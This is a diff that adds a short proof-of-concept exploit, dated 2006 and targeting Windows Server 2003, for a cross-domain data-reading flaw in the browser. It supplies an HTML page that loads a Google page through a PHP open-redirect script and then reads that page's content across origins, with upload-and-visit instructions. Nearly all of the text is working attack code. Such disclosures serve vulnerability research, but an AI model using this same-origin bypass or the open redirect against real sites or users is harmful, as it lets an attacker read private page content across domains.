@@ -1,0 +1,12 @@
+The following proof of concept is incomplete realization of the idea to demonstrate its feasibility.
+Windows Server 2003, Enterprise Edition, Service Pack 1, 15/06/2006
+
+Upload the following files to Web server, go to i.html
+------------------------- i.html -------------------------
+&lt;html&gt;&lt;body onload=&quot;setTimeout(&#039;alert(o.object.documentElement.outerHTML)&#039;,1000)&quot;&gt;
+&lt;object width=100 height=100 data=r.php?http://www.google.com/123456789 type=text/html id=o&gt;&lt;/object&gt;
+&lt;/body&gt;&lt;/html&gt;
+------------------------- r.php -------------------------
+&lt;?php header(&quot;Location: &quot;.$_SERVER[&quot;QUERY_STRING&quot;]); ?&gt;
+
+i.html displays content of Google Web page.
